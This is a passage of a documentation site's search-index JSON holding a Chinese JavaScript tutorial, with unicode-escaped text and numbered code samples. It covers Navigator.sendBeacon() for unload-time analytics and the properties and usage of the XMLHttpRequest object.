\uff0c\u62d6\u5ef6\u4e86350\u6beb\u79d2\uff0c\u624d\u8ba9\u9875\u9762\u8df3\u8f6c\uff0c\u56e0\u6b64\u4f7f\u5f97\u5f02\u6b65 AJAX \u6709\u65f6\u95f4\u53d1\u51fa\u3002 \u8fd9\u4e9b\u505a\u6cd5\u7684\u5171\u540c\u95ee\u9898\u662f\uff0c\u5378\u8f7d\u7684\u65f6\u95f4\u88ab\u786c\u751f\u751f\u62d6\u957f\u4e86\uff0c\u540e\u9762\u9875\u9762\u7684\u52a0\u8f7d\u88ab\u63a8\u8fdf\u4e86\uff0c\u7528\u6237\u4f53\u9a8c\u4e0d\u597d\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6d4f\u89c8\u5668\u5f15\u5165\u4e86 Navigator.sendBeacon() \u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u662f\u5f02\u6b65\u53d1\u51fa\u8bf7\u6c42\uff0c\u4f46\u662f\u8bf7\u6c42\u4e0e\u5f53\u524d\u9875\u9762\u7ebf\u7a0b\u8131\u94a9\uff0c\u4f5c\u4e3a\u6d4f\u89c8\u5668\u8fdb\u7a0b\u7684\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u8bc1\u4f1a\u628a\u6570\u636e\u53d1\u51fa\u53bb\uff0c\u4e0d\u62d6\u5ef6\u5378\u8f7d\u6d41\u7a0b\u3002 1 2 3 4 5 window . addEventListener ( 'unload' , logData , false ); function logData () { navigator . sendBeacon ( '/log' , analyticsData ); } Navigator.sendBeacon \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u6807\u670d\u52a1\u5668\u7684 URL\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6240\u8981\u53d1\u9001\u7684\u6570\u636e\uff08\u53ef\u9009\uff09\uff0c\u53ef\u4ee5\u662f\u4efb\u610f\u7c7b\u578b\uff08\u5b57\u7b26\u4e32\u3001\u8868\u5355\u5bf9\u8c61\u3001\u4e8c\u8fdb\u5236\u5bf9\u8c61\u7b49\u7b49\uff09\u3002 1 navigator . sendBeacon ( url , data ) \u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6210\u529f\u53d1\u9001\u6570\u636e\u4e3a true \uff0c\u5426\u5219\u4e3a false \u3002 \u8be5\u65b9\u6cd5\u53d1\u9001\u6570\u636e\u7684 HTTP \u65b9\u6cd5\u662f POST\uff0c\u53ef\u4ee5\u8de8\u57df\uff0c\u7c7b\u4f3c\u4e8e\u8868\u5355\u63d0\u4ea4\u6570\u636e\u3002\u5b83\u4e0d\u80fd\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <body onload=\"analytics('start')\" onunload=\"analytics('end')\"> function analytics ( state ) { if ( ! navigator . sendBeacon ) return ; var URL = 'http://example.com/analytics' ; var data = 'state=' + state + '&location=' + window . location ; navigator . sendBeacon ( URL , data ); }","title":"XMLHttpRequest \u5bf9\u8c61"},{"location":"bom/xmlhttprequest/#xmlhttprequest","text":"","title":"XMLHttpRequest \u5bf9\u8c61"},{"location":"bom/xmlhttprequest/#_1","text":"\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\uff0c\u91c7\u7528 HTTP \u534f\u8bae\u901a\u4fe1\u3002\u7528\u6237\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u952e\u5165\u4e00\u4e2a\u7f51\u5740\uff0c\u6216\u8005\u901a\u8fc7\u7f51\u9875\u8868\u5355\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u5185\u5bb9\uff0c\u8fd9\u65f6\u6d4f\u89c8\u5668\u5c31\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u3002 1999\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 IE \u6d4f\u89c8\u56685.0\u7248\uff0c\u7b2c\u4e00\u6b21\u5f15\u5165\u65b0\u529f\u80fd\uff1a\u5141\u8bb8 JavaScript \u811a\u672c\u5411\u670d\u52a1\u5668\u53d1\u8d77 HTTP \u8bf7\u6c42\u3002\u8fd9\u4e2a\u529f\u80fd\u5f53\u65f6\u5e76\u6ca1\u6709\u5f15\u8d77\u6ce8\u610f\uff0c\u76f4\u52302004\u5e74 Gmail \u53d1\u5e03\u548c2005\u5e74 Google Map \u53d1\u5e03\uff0c\u624d\u5f15\u8d77\u5e7f\u6cdb\u91cd\u89c6\u30022005\u5e742\u6708\uff0cAJAX \u8fd9\u4e2a\u8bcd\u7b2c\u4e00\u6b21\u6b63\u5f0f\u63d0\u51fa\uff0c\u5b83\u662f Asynchronous JavaScript and XML \u7684\u7f29\u5199\uff0c\u6307\u7684\u662f\u901a\u8fc7 JavaScript \u7684\u5f02\u6b65\u901a\u4fe1\uff0c\u4ece\u670d\u52a1\u5668\u83b7\u53d6 XML \u6587\u6863\u4ece\u4e2d\u63d0\u53d6\u6570\u636e\uff0c\u518d\u66f4\u65b0\u5f53\u524d\u7f51\u9875\u7684\u5bf9\u5e94\u90e8\u5206\uff0c\u800c\u4e0d\u7528\u5237\u65b0\u6574\u4e2a\u7f51\u9875\u3002\u540e\u6765\uff0cAJAX \u8fd9\u4e2a\u8bcd\u5c31\u6210\u4e3a JavaScript \u811a\u672c\u53d1\u8d77 HTTP \u901a\u4fe1\u7684\u4ee3\u540d\u8bcd\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u7528\u811a\u672c\u53d1\u8d77\u901a\u4fe1\uff0c\u5c31\u53ef\u4ee5\u53eb\u505a AJAX \u901a\u4fe1\u3002W3C \u4e5f\u57282006\u5e74\u53d1\u5e03\u4e86\u5b83\u7684\u56fd\u9645\u6807\u51c6\u3002 \u5177\u4f53\u6765\u8bf4\uff0cAJAX \u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\u3002 \u521b\u5efa XMLHttpRequest \u5b9e\u4f8b \u53d1\u51fa HTTP \u8bf7\u6c42 \u63a5\u6536\u670d\u52a1\u5668\u4f20\u56de\u7684\u6570\u636e \u66f4\u65b0\u7f51\u9875\u6570\u636e \u6982\u62ec\u8d77\u6765\uff0c\u5c31\u662f\u4e00\u53e5\u8bdd\uff0cAJAX \u901a\u8fc7\u539f\u751f\u7684 XMLHttpRequest \u5bf9\u8c61\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u5f97\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u540e\uff0c\u518d\u8fdb\u884c\u5904\u7406\u3002\u73b0\u5728\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u90fd\u662f JSON \u683c\u5f0f\u7684\u6570\u636e\uff0cXML \u683c\u5f0f\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff0c\u4f46\u662f AJAX \u8fd9\u4e2a\u540d\u5b57\u5df2\u7ecf\u6210\u4e86\u4e00\u4e2a\u901a\u7528\u540d\u8bcd\uff0c\u5b57\u9762\u542b\u4e49\u5df2\u7ecf\u6d88\u5931\u4e86\u3002 XMLHttpRequest \u5bf9\u8c61\u662f AJAX \u7684\u4e3b\u8981\u63a5\u53e3\uff0c\u7528\u4e8e\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5c3d\u7ba1\u540d\u5b57\u91cc\u9762\u6709 XML \u548c Http \uff0c\u5b83\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u534f\u8bae\uff08\u6bd4\u5982 file \u6216 ftp \uff09\uff0c\u53d1\u9001\u4efb\u4f55\u683c\u5f0f\u7684\u6570\u636e\uff08\u5305\u62ec\u5b57\u7b26\u4e32\u548c\u4e8c\u8fdb\u5236\uff09\u3002 XMLHttpRequest \u672c\u8eab\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 new \u547d\u4ee4\u751f\u6210\u5b9e\u4f8b\u3002\u5b83\u6ca1\u6709\u4efb\u4f55\u53c2\u6570\u3002 1 var xhr = new XMLHttpRequest (); \u4e00\u65e6\u65b0\u5efa\u5b9e\u4f8b\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 open() \u65b9\u6cd5\u6307\u5b9a\u5efa\u7acb HTTP \u8fde\u63a5\u7684\u4e00\u4e9b\u7ec6\u8282\u3002 1 xhr . open ( 'GET' , 'http://www.example.com/page.php' , true ); \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u4f7f\u7528 GET \u65b9\u6cd5\uff0c\u8ddf\u6307\u5b9a\u7684\u670d\u52a1\u5668\u7f51\u5740\u5efa\u7acb\u8fde\u63a5\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570 true \uff0c\u8868\u793a\u8bf7\u6c42\u662f\u5f02\u6b65\u7684\u3002 \u7136\u540e\uff0c\u6307\u5b9a\u56de\u8c03\u51fd\u6570\uff0c\u76d1\u542c\u901a\u4fe1\u72b6\u6001\uff08 readyState \u5c5e\u6027\uff09\u7684\u53d8\u5316\u3002 1 2 3 4 5 xhr . onreadystatechange = handleStateChange ; function handleStateChange () { // ... } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6 XMLHttpRequest \u5b9e\u4f8b\u7684\u72b6\u6001\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u8c03\u7528\u76d1\u542c\u51fd\u6570 handleStateChange \u6700\u540e\u4f7f\u7528 send() \u65b9\u6cd5\uff0c\u5b9e\u9645\u53d1\u51fa\u8bf7\u6c42\u3002 1 xhr . send ( null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c send() \u7684\u53c2\u6570\u4e3a null \uff0c\u8868\u793a\u53d1\u9001\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u4e0d\u5e26\u6709\u6570\u636e\u4f53\u3002\u5982\u679c\u53d1\u9001\u7684\u662f POST \u8bf7\u6c42\uff0c\u8fd9\u91cc\u5c31\u9700\u8981\u6307\u5b9a\u6570\u636e\u4f53\u3002 \u4e00\u65e6\u62ff\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\uff0cAJAX \u4e0d\u4f1a\u5237\u65b0\u6574\u4e2a\u7f51\u9875\uff0c\u800c\u662f\u53ea\u66f4\u65b0\u7f51\u9875\u91cc\u9762\u7684\u76f8\u5173\u90e8\u5206\uff0c\u4ece\u800c\u4e0d\u6253\u65ad\u7528\u6237\u6b63\u5728\u505a\u7684\u4e8b\u60c5\u3002 \u6ce8\u610f\uff0cAJAX \u53ea\u80fd\u5411\u540c\u6e90\u7f51\u5740\uff08\u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u90fd\u76f8\u540c\uff09\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u5982\u679c\u53d1\u51fa\u8de8\u57df\u8bf7\u6c42\uff0c\u5c31\u4f1a\u62a5\u9519\uff08\u8be6\u89c1\u300a\u540c\u6e90\u653f\u7b56\u300b\u548c\u300aCORS \u901a\u4fe1\u300b\u4e24\u7ae0\uff09\u3002 \u4e0b\u9762\u662f XMLHttpRequest \u5bf9\u8c61\u7b80\u5355\u7528\u6cd5\u7684\u5b8c\u6574\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function (){ // \u901a\u4fe1\u6210\u529f\u65f6\uff0c\u72b6\u6001\u503c\u4e3a4 if ( xhr . readyState === 4 ){ if ( xhr . status === 200 ){ console . log ( xhr . responseText ); } else { console . error ( xhr . statusText ); } } }; xhr . onerror = function ( e ) { console . error ( xhr . statusText ); }; xhr . open ( 'GET' , '/endpoint' , true ); xhr . send ( null );","title":"\u7b80\u4ecb"},{"location":"bom/xmlhttprequest/#xmlhttprequest_1","text":"","title":"XMLHttpRequest \u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"bom/xmlhttprequest/#xmlhttprequestreadystate","text":"XMLHttpRequest.readyState \u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5f53\u524d\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002\u5b83\u53ef\u80fd\u8fd4\u56de\u4ee5\u4e0b\u503c\u3002 0\uff0c\u8868\u793a XMLHttpRequest \u5b9e\u4f8b\u5df2\u7ecf\u751f\u6210\uff0c\u4f46\u662f\u5b9e\u4f8b\u7684 open() \u65b9\u6cd5\u8fd8\u6ca1\u6709\u88ab\u8c03\u7528\u3002 1\uff0c\u8868\u793a open() \u65b9\u6cd5\u5df2\u7ecf\u8c03\u7528\uff0c\u4f46\u662f\u5b9e\u4f8b\u7684 send() \u65b9\u6cd5\u8fd8\u6ca1\u6709\u8c03\u7528\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u5b9e\u4f8b\u7684 setRequestHeader() \u65b9\u6cd5\uff0c\u8bbe\u5b9a HTTP \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002 2\uff0c\u8868\u793a\u5b9e\u4f8b\u7684 send() \u65b9\u6cd5\u5df2\u7ecf\u8c03\u7528\uff0c\u5e76\u4e14\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5934\u4fe1\u606f\u548c\u72b6\u6001\u7801\u5df2\u7ecf\u6536\u5230\u3002 3\uff0c\u8868\u793a\u6b63\u5728\u63a5\u6536\u670d\u52a1\u5668\u4f20\u6765\u7684\u6570\u636e\u4f53\uff08body \u90e8\u5206\uff09\u3002\u8fd9\u65f6\uff0c\u5982\u679c\u5b9e\u4f8b\u7684 responseType \u5c5e\u6027\u7b49\u4e8e text \u6216\u8005\u7a7a\u5b57\u7b26\u4e32\uff0c responseText \u5c5e\u6027\u5c31\u4f1a\u5305\u542b\u5df2\u7ecf\u6536\u5230\u7684\u90e8\u5206\u4fe1\u606f\u3002 4\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u5df2\u7ecf\u5b8c\u5168\u63a5\u6536\uff0c\u6216\u8005\u672c\u6b21\u63a5\u6536\u5df2\u7ecf\u5931\u8d25\u3002 \u901a\u4fe1\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u5f53\u5b9e\u4f8b\u5bf9\u8c61\u53d1\u751f\u72b6\u6001\u53d8\u5316\uff0c\u5b83\u7684 readyState \u5c5e\u6027\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002\u8fd9\u4e2a\u503c\u6bcf\u4e00\u6b21\u53d8\u5316\uff0c\u90fd\u4f1a\u89e6\u53d1 readyStateChange \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); if ( xhr . readyState === 4 ) { // \u8bf7\u6c42\u7ed3\u675f\uff0c\u5904\u7406\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e } else { // \u663e\u793a\u63d0\u793a\u201c\u52a0\u8f7d\u4e2d\u2026\u2026\u201d } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c xhr.readyState \u7b49\u4e8e 4 \u65f6\uff0c\u8868\u660e\u811a\u672c\u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u5df2\u7ecf\u5b8c\u6210\u3002\u5176\u4ed6\u60c5\u51b5\uff0c\u90fd\u8868\u793a HTTP \u8bf7\u6c42\u8fd8\u5728\u8fdb\u884c\u4e2d\u3002","title":"XMLHttpRequest.readyState"},{"location":"bom/xmlhttprequest/#xmlhttprequestonreadystatechange","text":"XMLHttpRequest.onreadystatechange \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u3002 readystatechange \u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u5b9e\u4f8b\u7684 readyState \u5c5e\u6027\u53d8\u5316\uff09\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u5c5e\u6027\u3002 \u53e6\u5916\uff0c\u5982\u679c\u4f7f\u7528\u5b9e\u4f8b\u7684 abort() \u65b9\u6cd5\uff0c\u7ec8\u6b62 XMLHttpRequest \u8bf7\u6c42\uff0c\u4e5f\u4f1a\u9020\u6210 readyState \u5c5e\u6027\u53d8\u5316\uff0c\u5bfc\u81f4\u8c03\u7528 XMLHttpRequest.onreadystatechange \u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com' , true ); xhr . onreadystatechange = function () { if ( xhr . readyState !== 4 || xhr . status !== 200 ) { return ; } console . log ( xhr . responseText ); }; xhr . send ();","title":"XMLHttpRequest.onreadystatechange"},{"location":"bom/xmlhttprequest/#xmlhttprequestresponse","text":"XMLHttpRequest.response \u5c5e\u6027\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u4f53\uff08\u5373 HTTP \u56de\u5e94\u7684 body \u90e8\u5206\uff09\u3002\u5b83\u53ef\u80fd\u662f\u4efb\u4f55\u6570\u636e\u7c7b\u578b\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u3001\u5bf9\u8c61\u3001\u4e8c\u8fdb\u5236\u5bf9\u8c61\u7b49\u7b49\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u7531 XMLHttpRequest.responseType \u5c5e\u6027\u51b3\u5b9a\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u5982\u679c\u672c\u6b21\u8bf7\u6c42\u6ca1\u6709\u6210\u529f\u6216\u8005\u6570\u636e\u4e0d\u5b8c\u6574\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002\u4f46\u662f\uff0c\u5982\u679c responseType \u5c5e\u6027\u7b49\u4e8e text \u6216\u7a7a\u5b57\u7b26\u4e32\uff0c\u5728\u8bf7\u6c42\u6ca1\u6709\u7ed3\u675f\u4e4b\u524d\uff08 readyState \u7b49\u4e8e3\u7684\u9636\u6bb5\uff09\uff0c response \u5c5e\u6027\u5305\u542b\u670d\u52a1\u5668\u5df2\u7ecf\u8fd4\u56de\u7684\u90e8\u5206\u6570\u636e\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function () { if ( xhr . readyState === 4 ) { handler ( xhr . response ); } }","title":"XMLHttpRequest.response"},{"location":"bom/xmlhttprequest/#xmlhttprequestresponsetype","text":"XMLHttpRequest.responseType \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u6570\u636e\u7684\u7c7b\u578b\u3002\u8fd9\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u53ef\u4ee5\u5728\u8c03\u7528 open() \u65b9\u6cd5\u4e4b\u540e\u3001\u8c03\u7528 send() \u65b9\u6cd5\u4e4b\u524d\uff0c\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u5982\u4f55\u89e3\u8bfb\u8fd4\u56de\u7684\u6570\u636e\u3002\u5982\u679c responseType \u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5c31\u7b49\u540c\u4e8e\u9ed8\u8ba4\u503c text \u3002 XMLHttpRequest.responseType \u5c5e\u6027\u53ef\u4ee5\u7b49\u4e8e\u4ee5\u4e0b\u503c\u3002 \"\"\uff08\u7a7a\u5b57\u7b26\u4e32\uff09\uff1a\u7b49\u540c\u4e8e text \uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u6587\u672c\u6570\u636e\u3002 \"arraybuffer\"\uff1aArrayBuffer \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u6570\u7ec4\u3002 \"blob\"\uff1aBlob \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u5bf9\u8c61\u3002 \"document\"\uff1aDocument \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\u3002 \"json\"\uff1aJSON \u5bf9\u8c61\u3002 \"text\"\uff1a\u5b57\u7b26\u4e32\u3002 \u4e0a\u9762\u51e0\u79cd\u7c7b\u578b\u4e4b\u4e2d\uff0c text \u7c7b\u578b\u9002\u5408\u5927\u591a\u6570\u60c5\u51b5\uff0c\u800c\u4e14\u76f4\u63a5\u5904\u7406\u6587\u672c\u4e5f\u6bd4\u8f83\u65b9\u4fbf\u3002 document \u7c7b\u578b\u9002\u5408\u8fd4\u56de HTML / XML \u6587\u6863\u7684\u60c5\u51b5\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u6253\u5f00 CORS \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 Ajax \u6293\u53d6\u7f51\u9875\uff0c\u7136\u540e\u4e0d\u7528\u89e3\u6790 HTML \u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u5bf9\u6293\u53d6\u56de\u6765\u7684\u6570\u636e\u8fdb\u884c DOM \u64cd\u4f5c\u3002 blob \u7c7b\u578b\u9002\u5408\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\u56fe\u7247\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/path/to/image.png' , true ); xhr . responseType = 'blob' ; xhr . onload = function ( e ) { if ( this . status === 200 ) { var blob = new Blob ([ xhr . response ], { type : 'image/png' }); // \u6216\u8005 var blob = xhr . response ; } }; xhr . send (); \u5982\u679c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a ArrayBuffer \uff0c\u5c31\u53ef\u4ee5\u6309\u7167\u6570\u7ec4\u7684\u65b9\u5f0f\u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/path/to/image.png' , true ); xhr . responseType = 'arraybuffer' ; xhr . onload = function ( e ) { var uInt8Array = new Uint8Array ( this . response ); for ( var i = 0 , len = uInt8Array . length ; i < len ; ++ i ) { // var byte = uInt8Array[i]; } }; xhr . send (); \u5982\u679c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a json \uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u81ea\u52a8\u5bf9\u8fd4\u56de\u6570\u636e\u8c03\u7528 JSON.parse() \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece xhr.response \u5c5e\u6027\uff08\u6ce8\u610f\uff0c\u4e0d\u662f xhr.responseText \u5c5e\u6027\uff09\u5f97\u5230\u7684\u4e0d\u662f\u6587\u672c\uff0c\u800c\u662f\u4e00\u4e2a JSON \u5bf9\u8c61\u3002","title":"XMLHttpRequest.responseType"},{"location":"bom/xmlhttprequest/#xmlhttprequestresponsetext","text":"XMLHttpRequest.responseText \u5c5e\u6027\u8fd4\u56de\u4ece\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684\u5b57\u7b26\u4e32\uff0c\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002\u53ea\u6709 HTTP \u8bf7\u6c42\u5b8c\u6210\u63a5\u6536\u4ee5\u540e\uff0c\u8be5\u5c5e\u6027\u624d\u4f1a\u5305\u542b\u5b8c\u6574\u7684\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/server' , true ); xhr . responseType = 'text' ; xhr . onload = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { console . log ( xhr . responseText ); } }; xhr . send ( null );","title":"XMLHttpRequest.responseText"},{"location":"bom/xmlhttprequest/#xmlhttprequestresponsexml","text":"XMLHttpRequest.responseXML \u5c5e\u6027\u8fd4\u56de\u4ece\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684 HTML \u6216 XML \u6587\u6863\u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002\u5982\u679c\u672c\u6b21\u8bf7\u6c42\u6ca1\u6709\u6210\u529f\uff0c\u6216\u8005\u6536\u5230\u7684\u6570\u636e\u4e0d\u80fd\u88ab\u89e3\u6790\u4e3a XML \u6216 HTML\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002 \u8be5\u5c5e\u6027\u751f\u6548\u7684\u524d\u63d0\u662f HTTP \u56de\u5e94\u7684 Content-Type \u5934\u4fe1\u606f\u7b49\u4e8e text/xml \u6216 application/xml \u3002\u8fd9\u8981\u6c42\u5728\u53d1\u9001\u8bf7\u6c42\u524d\uff0c XMLHttpRequest.responseType \u5c5e\u6027\u8981\u8bbe\u4e3a document \u3002\u5982\u679c HTTP \u56de\u5e94\u7684 Content-Type \u5934\u4fe1\u606f\u4e0d\u7b49\u4e8e text/xml \u548c application/xml \uff0c\u4f46\u662f\u60f3\u4ece responseXML \u62ff\u5230\u6570\u636e\uff08\u5373\u628a\u6570\u636e\u6309\u7167 DOM \u683c\u5f0f\u89e3\u6790\uff09\uff0c\u90a3\u4e48\u9700\u8981\u624b\u52a8\u8c03\u7528 XMLHttpRequest.overrideMimeType() \u65b9\u6cd5\uff0c\u5f3a\u5236\u8fdb\u884c XML \u89e3\u6790\u3002 \u8be5\u5c5e\u6027\u5f97\u5230\u7684\u6570\u636e\uff0c\u662f\u76f4\u63a5\u89e3\u6790\u540e\u7684\u6587\u6863 DOM \u6811\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/server' , true ); xhr . responseType = 'document' ; xhr . overrideMimeType ( 'text/xml' ); xhr . onload = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { console . log ( xhr . responseXML ); } }; xhr . send ( null );","title":"XMLHttpRequest.responseXML"},{"location":"bom/xmlhttprequest/#xmlhttprequestresponseurl","text":"XMLHttpRequest.responseURL \u5c5e\u6027\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u9001\u6570\u636e\u7684\u670d\u52a1\u5668\u7684\u7f51\u5740\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com/test' , true ); xhr . onload = function () { // \u8fd4\u56de http://example.com/test console . log ( xhr . responseURL ); }; xhr . send ( null ); \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u4e0e open() \u65b9\u6cd5\u6307\u5b9a\u7684\u8bf7\u6c42\u7f51\u5740\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002\u5982\u679c\u670d\u52a1\u5668\u7aef\u53d1\u751f\u8df3\u8f6c\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u6700\u540e\u5b9e\u9645\u8fd4\u56de\u6570\u636e\u7684\u7f51\u5740\u3002\u53e6\u5916\uff0c\u5982\u679c\u539f\u59cb URL \u5305\u62ec\u951a\u70b9\uff08fragment\uff09\uff0c\u8be5\u5c5e\u6027\u4f1a\u628a\u951a\u70b9\u5265\u79bb\u3002","title":"XMLHttpRequest.responseURL"},{"location":"bom/xmlhttprequest/#xmlhttprequeststatusxmlhttprequeststatustext","text":"XMLHttpRequest.status \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u670d\u52a1\u5668\u56de\u5e94\u7684 HTTP \u72b6\u6001\u7801\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u901a\u4fe1\u6210\u529f\u7684\u8bdd\uff0c\u8fd9\u4e2a\u72b6\u6001\u7801\u662f200\uff1b\u5982\u679c\u670d\u52a1\u5668\u6ca1\u6709\u8fd4\u56de\u72b6\u6001\u7801\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5c5e\u6027\u9ed8\u8ba4\u662f200\u3002\u8bf7\u6c42\u53d1\u51fa\u4e4b\u524d\uff0c\u8be5\u5c5e\u6027\u4e3a 0 \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 200, OK\uff0c\u8bbf\u95ee\u6b63\u5e38 301, Moved Permanently\uff0c\u6c38\u4e45\u79fb\u52a8 302, Moved temporarily\uff0c\u6682\u65f6\u79fb\u52a8 304, Not Modified\uff0c\u672a\u4fee\u6539 307, Temporary Redirect\uff0c\u6682\u65f6\u91cd\u5b9a\u5411 401, Unauthorized\uff0c\u672a\u6388\u6743 403, Forbidden\uff0c\u7981\u6b62\u8bbf\u95ee 404, Not Found\uff0c\u672a\u53d1\u73b0\u6307\u5b9a\u7f51\u5740 500, Internal Server Error\uff0c\u670d\u52a1\u5668\u53d1\u751f\u9519\u8bef 